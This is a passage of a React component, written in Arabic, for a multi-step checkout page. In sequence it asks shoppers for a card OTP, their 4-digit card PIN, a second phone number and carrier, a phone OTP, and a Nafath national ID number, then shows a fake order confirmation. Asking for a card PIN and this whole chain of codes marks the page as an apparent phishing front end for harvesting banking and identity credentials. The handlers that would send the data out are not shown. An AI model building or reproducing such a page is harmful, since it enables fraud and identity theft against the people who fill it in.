                  onClick={() => setStep("payment")}
                  disabled={isVerifying}
                >
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handleCardOtpVerify} disabled={isVerifying}>
                  {isVerifying ? (
                    <>
                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    "تحقق"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "card-pin" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Shield className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">رمز PIN للبطاقة</CardTitle>
              <CardDescription className="text-center">أدخل رمز PIN المكون من 4 أرقام</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <div className="flex gap-2 justify-center" dir="ltr">
                  <Input
                    type="password"
                    inputMode="numeric"
                    maxLength={4}
                    value={cardPin}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, "")
                      setCardPin(value)
                    }}
                    className={`w-40 h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                  />
                </div>
                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 bg-transparent"
                  onClick={() => setStep("card-otp")}
                  disabled={isVerifying}
                >
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handleCardPinVerify} disabled={isVerifying}>
                  {isVerifying ? (
                    <>
                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    "تحقق"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "phone-verification" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Phone className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">معلومات الجوال</CardTitle>
              <CardDescription className="text-center">تأكيد بيانات الاتصال</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-3">
                <Label htmlFor="phone2">رقم الجوال الثاني</Label>
                <Input
                  id="phone2"
                  type="tel"
                  inputMode="numeric"
                  maxLength={10}
                  placeholder="05XXXXXXXX"
                  value={phone2}
                  onChange={(e) => {
                    setPhone2(e.target.value)
                    if (phone2Error) setPhone2Error("")
                  }}
                  className={phone2Error ? "border-destructive" : ""}
                />
                {phone2Error && <p className="text-sm text-destructive">{phone2Error}</p>}
              </div>

              <div className="p-4 bg-muted rounded-lg space-y-3">
                <Separator />
                <div className="flex justify-between items-center">
                  <span className="text-muted-foreground">مزود الخدمة</span>
                  <Badge variant="secondary" className="font-bold">
                    {phoneProvider}
                  </Badge>
                </div>
              </div>

              <div className="flex gap-3">
                <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("card-pin")}>
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handlePhoneVerification}>
                  متابعة التحقق
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "phone-otp" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Phone className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">التحقق من الجوال</CardTitle>
              <CardDescription className="text-center">
                تم إرسال رمز التحقق إلى رقم الجوال {shippingInfo.phone}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <Label className="text-center block mb-4">أدخل رمز التحقق</Label>
                <div className="flex gap-2 justify-center" dir="ltr">
                  <Input
                    type="text"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    maxLength={6}
                    value={phoneOtp}
                    onChange={(e) => setPhoneOtp(e.target.value)}
                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                  />
                </div>
                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
              </div>

              <div className="text-center text-sm text-muted-foreground">
                {canResendOtp ? (
                  <button onClick={handleResendOtp} className="text-primary hover:underline font-medium">
                    إعادة إرسال الرمز
                  </button>
                ) : (
                  <span>يمكنك إعادة الإرسال بعد {resendTimer} ثانية</span>
                )}
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 bg-transparent"
                  onClick={() => setStep("phone-verification")}
                  disabled={isVerifying}
                >
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handlePhoneOtpVerify} disabled={isVerifying}>
                  {isVerifying ? (
                    <>
                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    "تحقق"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "nafath" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Shield className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">التحقق عبر نفاذ</CardTitle>
              <CardDescription className="text-center">أدخل رقم الهوية الوطنية</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <Label className="text-center block mb-4">رقم الهوية (10 أرقام)</Label>
                <div className="flex gap-2 justify-center" dir="ltr">
                  <Input
                    type="text"
                    inputMode="numeric"
                    maxLength={10}
                    value={nafathId}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, "")
                      setNafathId(value)
                    }}
                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                    placeholder="1234567890"
                  />
                </div>
                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
              </div>

              <div className="flex items-center gap-2 rounded-md bg-muted px-3 py-2 text-sm text-muted-foreground">
                <Shield className="h-4 w-4" />
                التحقق عبر منصة نفاذ الوطنية الموحدة
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 bg-transparent"
                  onClick={() => setStep("phone-otp")}
                  disabled={isVerifying}
                >
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handleNafathVerify} disabled={isVerifying}>
                  {isVerifying ? (
                    <>
                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                      جاري التحقق...
                    </>
                  ) : (
                    "تحقق"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "auth-dialog" && (
          <Dialog open={true}>
            <DialogContent className="max-w-md">
              <DialogHeader>
                <div className="mx-auto w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                  <Check className="h-8 w-8 text-primary" />
                </div>
                <DialogTitle className="text-2xl text-center">تم التحقق بنجاح</DialogTitle>
                <DialogDescription className="text-center">
                  تم التحقق من جميع بياناتك بنجاح، هل تريد إتمام الطلب؟
                </DialogDescription>
              </DialogHeader>
              <div className="space-y-4">
                <div className="p-4 bg-muted rounded-lg space-y-2">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">الاسم</span>
                    <span className="font-medium">{shippingInfo.fullName}</span>
                  </div>
                  <Separator />
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">رقم الجوال</span>
                    <span className="font-medium">{shippingInfo.phone}</span>
                  </div>
                  <Separator />
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">مزود الخدمة</span>
                    <Badge variant="secondary">{phoneProvider}</Badge>
                  </div>
                  <Separator />
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">الإجمالي</span>
                    <span className="font-bold text-lg">{finalTotal.toFixed(2)} ريال</span>
                  </div>
                </div>

                {orderError && (
                  <div className="p-4 bg-destructive/10 border border-destructive/20 rounded-lg">
                    <p className="text-sm text-destructive text-center">{orderError}</p>
                  </div>
                )}

                <div className="flex gap-3">
                  <Button
                    variant="outline"
                    className="flex-1 bg-transparent"
                    onClick={() => setStep("nafath")}
                    disabled={isProcessingOrder}
                  >
                    رجوع
                  </Button>
                  <Button className="flex-1" onClick={handleFinalSubmit} disabled={isProcessingOrder}>
                    {isProcessingOrder ? (
                      <>
                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                        جاري المعالجة...
                      </>
                    ) : (
                      "إتمام الطلب"
                    )}
                  </Button>
                </div>
              </div>
            </DialogContent>
          </Dialog>
        )}

        {/* Success Step */}
        {step === "success" && (
          <Card className="text-center">
            <CardHeader>
              <div className="mx-auto w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <Check className="h-8 w-8 text-primary" />
              </div>
              <CardTitle className="text-2xl text-primary">تم تأكيد الطلب بنجاح</CardTitle>
              <CardDescription>شكرا لك، تم استلام طلبك وسيتم معالجته قريبا</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="p-4 bg-muted rounded-lg space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">رقم الطلب</span>
                  <span className="font-mono font-medium">
                    {localStorage.getItem("visitor")?.slice(-8) || "ORD12345"}
                  </span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">المبلغ الإجمالي</span>
                  <span className="font-bold">{finalTotal.toFixed(2)} ريال</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">وقت التوصيل المتوقع</span>
                  <span>3-5 أيام عمل</span>
                </div>
              </div>

              <p className="text-sm text-muted-foreground">
                سيتم إرسال تفاصيل الطلب إلى رقم الجوال {shippingInfo.phone}
              </p>

              <div className="flex gap-3 pt-4">
                <Button variant="outline" className="flex-1 bg-transparent">
                  تتبع الطلب
                </Button>
                <Button className="flex-1" onClick={() => window.location.reload()}>
                  طلب جديد
                </Button>
              </div>
            </CardContent>
          </Card>
        )}
      </div>

      {showMap && <MapAddressPicker onAddressSelect={handleMapAddressSelect} onClose={() => setShowMap(false)} />}
    </div>
  )
}
